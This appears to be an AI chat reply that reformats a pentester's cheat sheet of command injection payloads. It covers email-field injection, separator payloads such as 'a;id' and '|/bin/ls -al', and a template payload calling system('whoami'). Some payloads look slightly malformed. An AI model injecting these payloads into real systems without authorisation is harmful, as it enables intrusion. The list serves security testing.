إليك تنظيم النقاط بشكل نصي عادي ومنظم:

---

### **Command Injection Techniques**

#### **1. Testing in Links**
- **Email Command Injection**:
  ```bash
  $command@mailbox.com
  `$command`@mailbox.com
  `command`@mailbox.com
  ```

#### **2. Parameter Found in JavaScript**
- **Command Injection Payloads**:
  ```bash
  a);id
  a;id
  a);id;
  a;id;
  a);id|
  a;id|
  a)|id
  a|id
  a)|id;
  a|id
  |/bin/ls -al
  a);/usr/bin/id
  a;/usr/bin/id
  ```

#### **3. JavaScript Command Injection**
- **System Command Execution**:
  ```bash
  ` ${
  @print
  (system('whoami'))} `
  ```

---

### **How to Use This Information**
1. **Email Command Injection**:
   - Test for command injection vulnerabilities in email fields by injecting commands.

2. **JavaScript Parameter Injection**:
   - Use the provided payloads to test for command injection vulnerabilities in JavaScript parameters.

3. **System Command Execution**:
   - Inject system commands in JavaScript contexts to execute arbitrary commands.

---
- https://sallam.gitbook.io/sec-88/web-appsec/command-injection
إذا كنت بحاجة إلى أي تعديلات إضافية، فلا تتردد في طلبها! 😊
